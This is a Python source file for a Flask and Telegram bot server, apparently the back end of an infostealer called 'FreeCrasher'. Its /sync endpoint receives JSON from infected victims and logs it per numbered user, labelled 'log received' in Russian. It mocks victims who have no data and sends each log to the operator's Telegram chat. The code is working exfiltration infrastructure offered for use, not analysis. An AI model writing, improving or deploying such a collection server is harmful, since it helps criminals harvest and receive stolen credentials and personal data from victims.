import telebot
from flask import Flask, request
import os
import threading
import time


API_TOKEN = os.environ.get('BOT_TOKEN')
MY_ID = os.environ.get('ADMIN_ID')

app = Flask(__name__)
bot = telebot.TeleBot(API_TOKEN)


def get_uid():
    path = "uid.txt"
    if not os.path.exists(path):
        with open(path, "w") as f: f.write("0")
    
    with open(path, "r+") as f:
        try:
            content = f.read().strip()
            n = int(content) + 1 if content else 1
        except ValueError:
            n = 1
        f.seek(0)
        f.write(str(n))
        f.truncate()
        return n

@app.route('/sync', methods=['POST'])
def handle():
    try:
        payload = request.json
        if not payload:
            return "No JSON", 400

        uid = get_uid()
        out = f"user_{uid}_data.txt"
        
        is_poor = all(v == "NONE" or v == "NOT_FOUND" for v in payload.values())
        
        with open(out, "w", encoding='utf-8') as f:
            if is_poor:
                f.write(f"User_{uid} - Данных нет (нищита)")
                cap = f" **FreeCrasher Alert**\nID: `{uid}`\nСтатус: **НИЩИТА**"
            else:
                f.write(f"=== FREE CRASHER LOG USER {uid} ===\n\n")
                for k, v in payload.items():
                    f.write(f"[{k}]:\n{v}\n\n")
                cap = f" **FreeCrasher Alert**\nID: `{uid}`\nСтатус: **ЛОГ ПОЛУЧЕН**"

        # Отправка в Telegram
        with open(out, 'rb') as doc:
            bot.send_document(MY_ID, doc, caption=cap, parse_mode='Markdown')
        
        if os.path.exists(out):
            os.remove(out)
            
        return "OK", 200
    except Exception as e:
        print(f"Server Error: {e}")
        return "Internal Error", 500

# --- ЗАПУСК FLASK ---
def run_flask():

    port = int(os.environ.get("PORT", 5000))
    # use_reloader=False ОБЯЗАТЕЛЕН, чтобы бот не запускался дважды!
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == "__main__":

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print(f"Flask Server started on port {os.environ.get('PORT', 5000)}")

    while True:
        try:
            print("Telegram Bot Polling started...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling Conflict or Error: {e}")
            time.sleep(10)
